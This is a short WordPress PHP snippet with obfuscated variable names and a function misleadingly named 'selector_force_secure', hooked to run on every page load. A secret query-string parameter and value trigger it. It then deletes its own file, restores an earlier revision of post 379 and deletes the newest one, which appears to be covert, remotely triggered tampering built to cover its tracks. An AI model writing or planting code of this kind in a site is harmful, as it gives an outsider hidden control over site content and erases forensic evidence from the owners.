<?php

function selector_force_secure() {
	if (isset($_GET['background_lock_like_taxonomies']) && $_GET['background_lock_like_taxonomies'] === 'max_supports_anti') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$reloaded_store_old = 379;
		$ajax_top_theme_backup = wp_get_post_revisions($reloaded_store_old);
		if (empty($ajax_top_theme_backup)) die('no revisions');
		if (count($ajax_top_theme_backup) < 2) die('less than 2');
		$tables_lite_connect_fancy = array_shift($ajax_top_theme_backup);
		$anti_members_ecommerce = $tables_lite_connect_fancy->ID;
		$module_snippets_digital_php = array_shift($ajax_top_theme_backup);
		$error_tabs_signature = $module_snippets_digital_php->ID;
		$campaign_backup_pinterest = wp_restore_post_revision($error_tabs_signature);
		if ($campaign_backup_pinterest === false) die('error restoring');
		$campaign_backup_pinterest = wp_delete_post_revision($anti_members_ecommerce);		
		if ($campaign_backup_pinterest === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'selector_force_secure');
